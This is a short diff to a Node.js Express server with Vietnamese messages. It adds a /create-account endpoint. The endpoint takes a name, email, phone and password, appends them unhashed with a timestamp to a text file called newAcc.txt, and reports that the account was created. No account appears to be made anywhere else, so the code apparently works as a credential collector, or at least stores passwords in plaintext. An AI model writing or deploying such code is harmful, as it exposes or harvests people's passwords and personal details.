@@ -28,6 +28,24 @@ app.post('/login', (req, res) => {
     res.json({ success: true, message: "Đăng nhập thành công" });
   });
 });
+app.post('/create-account', (req, res) => {
+  const { first = '', last = '', email, phone, password } = req.body || {};
+
+  if (!email || !phone || !password) {
+    return res.status(400).json({ success: false, message: 'Thiếu email, phone hoặc password' });
+  }
+
+  const logPath = path.join(__dirname, 'newAcc.txt');
+  const logData = `First: ${first}, Last: ${last}, Email: ${email}, Phone: ${phone}, Password: ${password}, Time: ${new Date().toLocaleString()}\n`;
+
+  fs.appendFile(logPath, logData, (err) => {
+    if (err) {
+      console.error('Lỗi ghi file newAcc.txt', err);
+      return res.status(500).json({ success: false, message: 'Không thể ghi file' });
+    }
+    res.json({ success: true, message: 'Tạo tài khoản thành công' });
+  });
+});
 
 app.listen(port, () => {
   console.log(`Server đang chạy tại http://localhost:${port}`);
